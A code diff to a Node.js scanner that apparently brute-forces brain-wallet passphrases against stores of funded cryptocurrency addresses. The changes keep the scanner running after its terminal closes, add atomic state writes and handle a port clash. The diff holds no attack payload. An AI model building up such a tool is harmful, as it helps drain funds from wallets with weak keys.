@@ -25,7 +25,14 @@ function captureSignal(sig) {
     try { process.exit(0); } catch (_) {}
   }, 400);
 }
-['SIGINT', 'SIGTERM', 'SIGHUP'].forEach((sig) => process.on(sig, () => captureSignal(sig)));
+['SIGINT', 'SIGTERM'].forEach((sig) => process.on(sig, () => captureSignal(sig)));
+// SIGHUP on macOS = "the terminal window closed / session hung up". A scanner that
+// quits here is exactly the 'it keeps stopping' bug - survive it and keep scanning.
+process.on('SIGHUP', () => {
+  try { console.log('[SIGHUP] terminal closed - the scanner keeps running in the background'); } catch (_) {}
+});
+// With the terminal gone our console pipe can break - swallow EPIPE instead of dying.
+for (const st of [process.stdout, process.stderr]) { try { st.on('error', () => {}); } catch (_) {} }
 const eng = require('./crypto_engine.js');
 
 const BRAIN_PHRASES = [
@@ -88,12 +95,24 @@ const APP_DIR = __dirname;
 
 /** Load persisted JSON. A missing or corrupt file returns the fallback and is
  *  renamed aside — never throws — so one bad write cannot kill the scanner. */
+function writeFileAtomic(file, data) {
+  const tmp = `${file}.tmp-${process.pid}`;
+  fs.writeFileSync(tmp, data);
+  fs.renameSync(tmp, file);
+}
+async function writeFileAtomicAsync(file, data) {
+  const tmp = `${file}.tmp-${process.pid}`;
+  await fs.promises.writeFile(tmp, data);
+  await fs.promises.rename(tmp, file);
+}
+
 function loadJsonOr(file, fallback) {
   try {
     return JSON.parse(fs.readFileSync(file, 'utf8'));
   } catch (err) {
     if (fs.existsSync(file)) {
       console.warn('[state] could not parse', path.basename(file), '-', err.message, '(using fallback)');
+    try { fs.renameSync(file, `${file}.corrupt-${Date.now()}`); } catch (_) {}
       try { fs.renameSync(file, file + '.corrupt'); } catch (_) {}
     }
     return fallback;
@@ -267,7 +286,7 @@ function saveFundedBloomStore() {
   setImmediate(async () => {
     try {
       await fs.promises.writeFile(FUNDED_BLOOM_STORE_PATH, Buffer.from(sharedFundedBloomBytes));
-      await fs.promises.writeFile(FUNDED_BLOOM_META_PATH, JSON.stringify(fundedBloomMeta, null, 2));
+      await writeFileAtomicAsync(FUNDED_BLOOM_META_PATH, JSON.stringify(fundedBloomMeta, null, 2));
     } catch (_) {
     } finally {
       savingFundedBloom = false;
@@ -453,9 +472,9 @@ function saveEmptyStore() {
         duplicatesPrevented: totalDuplicatesPrevented
       });
       const bloomCopy = Buffer.from(sharedBloomBytes);
-      await fs.promises.writeFile(EMPTY_STORE_PATH, payload);
+      await writeFileAtomicAsync(EMPTY_STORE_PATH, payload);
       await fs.promises.writeFile(BLOOM_STORE_PATH, bloomCopy);
-      await fs.promises.writeFile(PERSISTENT_EMPTY_STORE_PATH, payload);
+      await writeFileAtomicAsync(PERSISTENT_EMPTY_STORE_PATH, payload);
       await fs.promises.writeFile(PERSISTENT_BLOOM_STORE_PATH, bloomCopy);
     } catch (_) {
     } finally {
@@ -597,7 +616,7 @@ function saveBrainState() {
   savingBrainState = true;
   setImmediate(async () => {
     try {
-      await fs.promises.writeFile(BRAIN_STATE_PATH, JSON.stringify(brainState, null, 2));
+      await writeFileAtomicAsync(BRAIN_STATE_PATH, JSON.stringify(brainState, null, 2));
     } catch (_) {
     } finally {
       savingBrainState = false;
@@ -2368,7 +2387,7 @@ function saveApiKeysConfig() {
    file instead of guesswork. Everything here is read-only telemetry: it never
    invents a balance, never promotes a lead and never touches a vault.
    ──────────────────────────────────────────────────────────────────────── */
-const APP_VERSION = '2.8.3';
+const APP_VERSION = '2.8.4';
 const DIAG_LOG_FILE = path.join(PERSISTENT_STATE_DIR, 'diagnostics.log');
 const DIAG_REPORT_FILE = path.join(PERSISTENT_STATE_DIR, 'DIAGNOSTIC_REPORT.txt');
 const DIAG_BOOT_AT = Date.now();
@@ -7019,6 +7038,11 @@ server.on('clientError', (err, socket) => {
 });
 server.on('error', (err) => {
   console.error('[HTTP Server Error]', err && err.message);
+  if (err && err.code === 'EADDRINUSE') {
+    console.log(`Another scanner already owns port ${HTTP_PORT_TARGET} - open http://127.0.0.1:${HTTP_PORT_TARGET}/ (this duplicate will now exit)`);
+    appendCrashDiary(`EADDRINUSE on port ${HTTP_PORT_TARGET} - duplicate instance exiting`);
+    process.exit(0);
+  }
 });
 
 const PORT = HTTP_PORT_TARGET;
@@ -7111,6 +7135,8 @@ process.on('exit', (code) => {
 });
 for (const sig of ['SIGTERM', 'SIGINT', 'SIGHUP', 'SIGQUIT']) {
   process.on(sig, () => {
-    appendCrashDiary(`received ${sig} - shutting down`);
+    appendCrashDiary(sig === 'SIGHUP'
+      ? 'received SIGHUP (terminal closed) - ignored, scanner keeps running'
+      : `received ${sig} - shutting down`);
   });
 }
